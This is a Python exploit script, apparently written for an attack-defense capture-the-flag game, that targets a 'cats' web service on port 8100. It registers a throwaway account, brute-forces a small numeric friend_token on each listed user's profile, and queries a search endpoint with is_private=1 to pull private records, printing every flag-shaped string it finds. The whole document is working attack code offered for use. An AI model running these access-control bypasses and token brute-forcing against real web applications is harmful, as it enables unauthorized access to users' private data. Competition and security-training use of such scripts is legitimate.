#!/usr/bin/env python3

import random
import re
import string
import sys
import os.path
import requests


team_addr = sys.argv[1]
PORT = 8100
USERS = []


def read():
    global USERS
    if not os.path.isfile("cats__users.txt"):
        write("")
    res = filter(lambda x: len(x),open("cats__users.txt", "r").read().split('\n'))
    if res is not None:
        USERS = set(res)
    else:
        USERS = []


def write(new_users):
    with open("cats__users.txt", "a+") as w:
        w.write('\n'.join(new_users))


def generate_rand(N=16):
    return ''.join(random.choice(string.ascii_letters) for i in range(N))


def getNewUsers(users):
    new_users = []
    for user in users:
        if user not in USERS:
            new_users.append(user)
    return new_users


def register_user():
    login, password = generate_rand(16), generate_rand(16)
    s = requests.Session()

    r = s.post("http://{}:{}/accounts/register/".format(team_addr, PORT), {
        "login": login,
        "password": password,
    })

    r = s.post("http://{}:{}/accounts/login/".format(team_addr, PORT), {
        "username": login,
        "password": password,
        "next": "/"
    })

    r = s.get("http://{}:{}/users".format(team_addr, PORT))
    return s, r, login, password


def exploit_one():
    s, r, login, password = register_user()

    with open("cats__users.txt", "a+") as w:
        all_users = re.findall(r'>(\S+)</a>', r.text)
        new_users = getNewUsers(all_users)
        for user in new_users:
            for friend_token in range(0, 7):
                r = s.get("http://{}:{}/user/{}?friend_token={}".format(team_addr, PORT, user, friend_token))
                for flag in set(re.findall(r'<div>([a-zA-Z0-9]{31}\=)</div>', r.text)):
                    print(flag, flush=True)
            w.write(user + "\n")
            w.flush()


def exploit_two():
    s, _, _, _ = register_user()
    r = s.get("http://{}:{}/search/?is_private=1".format(team_addr, PORT))
    for flag in set(re.findall(r'<div>([a-zA-Z0-9]{31}\=)</div>', r.text)):
        print(flag, flush=True)


read()
exploit_two()
exploit_one()
